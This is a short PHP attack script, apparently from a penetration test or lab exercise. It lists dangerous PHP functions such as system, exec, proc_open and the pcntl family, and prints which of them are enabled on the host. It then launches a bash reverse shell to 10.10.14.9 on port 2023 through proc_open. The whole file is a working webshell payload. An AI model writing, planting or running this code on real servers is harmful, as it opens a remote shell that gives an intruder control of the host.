<?php
$dangerous_func = array('pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited',
'pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig',
'pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler','pcntl_signal_dispatch','pcntl_get_last_error',
'pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait','pcntl_exec','pcntl_getpriority',
'pcntl_setpriority','pcntl_async_signals','error_log','system','exec','shell_exec','popen','proc_open',
'passthru','link','symlink','syslog','ld','mail','mb_send_mail','imap_open','imap_mail','libvirt_connect','gnupg_init',
'imagick');

// Loop through dangerous_functions and print if it enabled
foreach ($dangerous_func as $function) {
    if (function_exists($function)) {
        echo $function . " is enabled\n";
    }
}

//  php execute code with proc_open
$cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.9/2023 0>&1'";

$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "a")
);

$process = proc_open($cmd, $descriptorspec, $pipes);
